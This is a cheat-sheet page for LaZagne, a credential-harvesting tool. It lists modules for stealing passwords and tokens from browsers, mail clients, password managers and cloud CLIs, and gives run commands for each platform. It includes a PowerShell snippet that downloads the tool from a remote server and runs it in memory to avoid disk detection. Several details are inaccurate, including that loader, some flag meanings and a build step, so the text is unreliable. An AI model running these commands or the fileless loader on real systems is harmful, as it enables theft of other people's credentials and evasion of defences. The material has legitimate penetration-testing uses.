# LaZagne — Credential Recovery from Local Systems

Open-source tool for recovering stored credentials (passwords, hashes, tokens, keys) from the local system. Extracts from browsers, databases, email clients, internal password managers, network connections, and system vaults on Windows, Linux, and macOS.

## How It Works

LaZagne scans the local filesystem, registry (Windows), keychain (macOS), process memory, and configuration files for stored credential material. Each application type has a dedicated module.

**Module categories:**

| Category | Modules |
|----------|---------|
| **Browsers** | Chrome, Firefox, Edge, Brave, Opera, Vivaldi, IE — decrypt stored passwords from SQLite DBs using DPAPI/Linux keyring/master passwords |
| **Databases** | SQL Server Management Studio, MySQL Workbench, PostgreSQL pgAdmin, Squirrel, Robo3T, DBeaver |
| **Mail** | Outlook, Thunderbird, Foxmail, Pidgin, Becky! |
| **System** | Windows logon (SAM/DPAPI), Kerberos tickets, WiFi profiles, VNC, RDP saved connections |
| **Internal PM** | KeePass (master password extraction), 1Password, Dashlane — if unlocked in memory |
| **Network** | FileZilla, WinSCP, OpenVPN, PuTTY (saved sessions), mRemoteNG |
| **IM** | Discord, Slack, Teams, Skype |
| **Dev** | AWS CLI, Azure CLI, GCP CLI credentials, Git credentials, SVN, Docker |
| **Sysadmin** | SNMP strings, Putty, Radmin, TightVNC, TeamViewer |

**Decryption mechanisms:**
- **Windows:** DPAPI `CryptUnprotectData()`, LSASS read, registry hive parsing
- **Linux:** GNOME Keyring, KDE Wallet, plaintext config parsing
- **macOS:** Keychain (security CLI), generic-application passwords

## Manual

### Windows

```batch
# Standard run — discover + recover all
lazagne.exe all

# Specific category
lazagne.exe browsers
lazagne.exe databases
lazagne.exe mails
lazagne.exe wifi

# Specific application
lazagne.exe chrome
lazagne.exe outlook

# Include only enabled (logged-in) browsers
lazagne.exe browsers -oA 2>/nul

# Output to file
lazagne.exe all -oN results.txt

# JSON output
lazagne.exe all -oJ

# Write directly to stdout
lazagne.exe all -quiet

# Run as another user (if you have SYSTEM or impersonation)
lazagne.exe all -user <username>

# Password file for master password prompts
lazagne.exe all -password MasterPass123
```

### Linux

```bash
# Standard run
python3 laZagne.py all

# Specific
python3 laZagne.py browsers

# Root for system-wide credentials
sudo python3 laZagne.py all
```

### macOS

```bash
# Standard run
python3 laZagne.py all

# Specific
python3 laZagne.py browsers
```

### Write-Only Mode (Penetration Testers)

```powershell
# Run from memory (avoid disk)
$bytes = (Invoke-WebRequest -Uri "http://server/lazagne.exe").Content
$assembly = [System.Reflection.Assembly]::Load($bytes)
[LaZagne.Program]::Main(@("all"))
```

## Build

```bash
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne/Linux

# Linux
pip install -r requirements.txt

# Windows — use PyInstaller
pyinstaller --onefile --noconsole laZagne.py
```

## Install

```bash
# Linux
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne/Linux
pip install -r requirements.txt

# Windows — download prebuilt binary from releases
# https://github.com/AlessandroZ/LaZagne/releases
```

## Package

| Manager | Command |
|---------|---------|
| GitHub Releases | https://github.com/AlessandroZ/LaZagne/releases |
| Source | `git clone https://github.com/AlessandroZ/LaZagne.git` |

## Links

| Resource | URL |
|----------|-----|
| GitHub | https://github.com/AlessandroZ/LaZagne |
| Wiki | https://github.com/AlessandroZ/LaZagne/wiki |
| Supported passwords list | https://github.com/AlessandroZ/LaZagne/wiki/Supported-software |
| Releases | https://github.com/AlessandroZ/LaZagne/releases |
| Old blog | https://lazagne.wordpress.com/ |
